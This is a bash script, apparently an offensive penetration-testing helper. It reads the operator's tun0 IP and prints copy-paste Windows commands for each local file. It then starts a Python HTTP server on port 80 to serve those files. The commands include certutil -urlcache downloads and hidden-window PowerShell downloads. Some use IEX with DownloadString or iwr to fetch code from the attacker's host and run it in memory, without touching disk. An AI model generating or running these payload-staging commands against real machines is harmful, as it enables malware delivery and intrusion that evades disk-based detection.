#!/usr/bin/env bash
set -euo pipefail

# 1) get tun0 ip and print
ip=$(ip a show tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d'/' -f1 || true)
echo "your local host is:"
if [ -n "$ip" ]; then
  echo "$ip"
else
  echo "(no tun0 found)"
fi

# 2) Plain ls (no flags)
echo ""
echo "Files in current directory:"
ls
echo ""

# 3) Ask user for output directory
read -p "Enter output directory (press Enter for current directory): " output_dir
if [ -n "$output_dir" ]; then
  # Remove trailing slash if present
  output_dir="${output_dir%/}"
  echo "Using output directory: $output_dir"
else
  echo "Using current directory (no output path specified)"
fi
echo ""

# 4) Ask user for command type preference
echo "Select command type:"
echo "1) Certutil only"
echo "2) All commands (certutil + PowerShell variants)"
read -p "Enter choice [1/2]: " choice

# only processing files
files=()
for item in *; do
  [ -f "$item" ] && files+=("$item")
done

echo ""
echo "==================================="
echo "Copy-paste commands below:"
echo "==================================="
echo ""

if [ "$choice" = "1" ]; then
  # Certutil only
  for f in "${files[@]}"; do
    if [ -n "$output_dir" ]; then
      echo "certutil -f -urlcache -split http://$ip/$f $output_dir\\$f"
    else
      echo "certutil -f -urlcache -split http://$ip/$f"
    fi
  done
else
  # All commands grouped by type
  echo "# Certutil"
  for f in "${files[@]}"; do
    if [ -n "$output_dir" ]; then
      echo "certutil -f -urlcache -split http://$ip/$f $output_dir\\$f"
    else
      echo "certutil -f -urlcache -split http://$ip/$f"
    fi
  done
  echo ""
  
  echo "# PowerShell Invoke-WebRequest (iwr)"
  for f in "${files[@]}"; do
    if [ -n "$output_dir" ]; then
      echo "powershell -NoP -W Hidden -c \"iwr http://$ip/$f -UseBasicParsing -OutFile $output_dir\\$f\""
    else
      echo "powershell -NoP -W Hidden -c \"iwr http://$ip/$f -UseBasicParsing -OutFile C:\\Windows\\Temp\\$f\""
    fi
  done
  echo ""
  
  echo "# PowerShell WebClient DownloadFile"
  for f in "${files[@]}"; do
    if [ -n "$output_dir" ]; then
      echo "powershell -NoP -W Hidden -c \"(New-Object Net.WebClient).DownloadFile('http://$ip/$f','$output_dir\\$f')\""
    else
      echo "powershell -NoP -W Hidden -c \"(New-Object Net.WebClient).DownloadFile('http://$ip/$f','C:\\Windows\\Temp\\$f')\""
    fi
  done
  echo ""
  
  echo "# PowerShell WebClient DownloadString (execute in memory, no disk)"
  for f in "${files[@]}"; do
    echo "powershell -NoP -W Hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://$ip/$f')\""
  done
  echo ""
  
  echo "# PowerShell Invoke-Expression with iwr (execute in memory)"
  for f in "${files[@]}"; do
    echo "powershell -NoP -W Hidden -c \"IEX (iwr http://$ip/$f -UseBasicParsing)\""
  done
  echo ""
fi

# 5) Run simple HTTP server
echo "==================================="
echo "Starting HTTP server on port 80..."
echo "==================================="
sudo python3 -m http.server 80
